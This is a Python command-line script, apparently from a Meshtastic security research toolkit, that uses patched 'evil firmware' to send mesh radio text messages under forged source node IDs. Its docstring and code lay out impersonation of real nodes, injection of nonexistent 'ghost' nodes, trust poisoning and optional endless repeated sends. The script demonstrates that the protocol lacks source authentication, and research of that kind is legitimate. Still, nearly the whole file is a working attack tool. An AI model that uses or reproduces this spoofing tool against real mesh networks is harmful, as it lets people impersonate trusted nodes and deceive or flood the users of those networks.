#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "meshtastic",
# ]
# ///
"""
spoof.py — Source node ID spoofing via evil firmware

Sends Meshtastic packets with a fabricated 'from' node ID. Demonstrates
that Meshtastic has no cryptographic source authentication — any node ID
can be impersonated, including node IDs that do not exist on the mesh.

Requires evil firmware with EVIL_ALLOW_FROM_OVERRIDE=1. Stock firmware
zeroes the 'from' field before processing (MeshService.cpp:188: p.from = 0),
making source spoofing impossible via the Python API without this patch.

Attack classes:
  - Identity impersonation (appear as another real node)
  - Ghost node injection (appear as a node that doesn't exist)
  - Trust poisoning (send malicious messages appearing to be from trusted nodes)

Usage:
    # Impersonate a specific node
    python tools/spoof.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --from 0x48ca4359 --message "I am not who you think I am"

    # Send as a completely fake node ID
    python tools/spoof.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --from 0xDEADBEEF --message "Ghost node was here" --count 5

    # Broadcast on a different channel
    python tools/spoof.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --from 0xCAFEBABE --channel 1 --message "Spoofed admin message"
"""

import argparse
import sys
import time
import signal
import struct

from common import add_connection_args, build_interface, evil_mode, print_banner


def send_spoofed_text(iface, from_node_id: int, text: str,
                      dest="^all", channel=0, hop_limit=3):
    """
    Send a text message with a spoofed 'from' node ID.

    With EVIL_ALLOW_FROM_OVERRIDE in the firmware, the ToRadio packet's
    'from' field is respected instead of being zeroed. We construct the
    MeshPacket directly and set the from field before submitting.
    """
    import meshtastic.protobuf.mesh_pb2 as mesh_pb2
    import meshtastic.protobuf.portnums_pb2 as portnums_pb2

    # Build the inner Data message (text payload)
    data = mesh_pb2.Data()
    data.portnum = portnums_pb2.PortNum.TEXT_MESSAGE_APP
    data.payload = text.encode("utf-8")

    # Build the MeshPacket with spoofed from field
    packet = mesh_pb2.MeshPacket()
    # 'from' is a Python keyword; protobuf uses setattr or field number access
    setattr(packet, "from", from_node_id)
    packet.to = 0xFFFFFFFF if dest == "^all" else int(dest, 16)
    packet.channel = channel
    packet.hop_limit = hop_limit
    packet.hop_start = hop_limit
    packet.want_ack = False
    packet.decoded.CopyFrom(data)

    # Send via the stream interface's low-level ToRadio path
    toRadio = mesh_pb2.ToRadio()
    toRadio.packet.CopyFrom(packet)
    iface._sendToRadio(toRadio)


def main():
    parser = argparse.ArgumentParser(
        description="Send Meshtastic packets with a spoofed source node ID",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Usage:")[0].strip(),
    )
    add_connection_args(parser)
    parser.add_argument("--from", dest="from_node", required=True, metavar="NODE_ID",
                        help="Source node ID to spoof (hex, e.g. 0xDEADBEEF)")
    parser.add_argument("--message", default="Evil node was here",
                        help="Message to send")
    parser.add_argument("--count", type=int, default=1,
                        help="Number of messages to send (0 = infinite, default: 1)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Seconds between messages (default: 1.0)")
    parser.add_argument("--channel", type=int, default=0,
                        help="Channel index (default: 0)")
    parser.add_argument("--dest", default="^all",
                        help="Destination (default: broadcast)")
    parser.add_argument("--hop-limit", type=int, default=3, choices=range(0, 8),
                        metavar="{0..7}", help="Hop limit (default: 3)")
    args = parser.parse_args()

    if not evil_mode(args):
        print("[!] WARNING: --evil not specified. Source spoofing requires evil firmware.")
        print("[!] Stock firmware will ignore the --from field and use its own node ID.")
        print()

    fake_from = int(args.from_node, 16)

    print(f"[*] Connecting to node...")
    iface = build_interface(args)
    time.sleep(2)

    info, node_num = print_banner(iface, args, "spoof.py — source ID spoofing")
    print(f"[*] Real node:   0x{node_num:08x}")
    print(f"[*] Spoofed from: 0x{fake_from:08x}")
    print()

    if fake_from == node_num:
        print("[!] Note: spoofed ID matches real node ID — no difference from normal send")

    count = 0
    total = args.count
    running = True

    def handle_sigint(sig, frame):
        nonlocal running
        print(f"\n[*] Interrupted. Sent {count} packets.")
        running = False

    signal.signal(signal.SIGINT, handle_sigint)

    print(f"[*] Sending {'∞' if total == 0 else total} packet(s): from=0x{fake_from:08x} "
          f"ch={args.channel} hop={args.hop_limit}")
    print(f"[*] Message: '{args.message}'")
    print()

    start = time.time()
    while running and (total == 0 or count < total):
        try:
            send_spoofed_text(
                iface,
                from_node_id=fake_from,
                text=args.message,
                dest=args.dest,
                channel=args.channel,
                hop_limit=args.hop_limit,
            )
            count += 1
            print(f"  [{count:>5}] Sent from=0x{fake_from:08x}: '{args.message}'")
        except Exception as e:
            print(f"  [ERROR] {e}")

        if total == 0 or count < total:
            time.sleep(args.interval)

    print(f"\n[*] Done. Sent {count} spoofed packet(s) in {time.time()-start:.1f}s")
    iface.close()


if __name__ == "__main__":
    main()
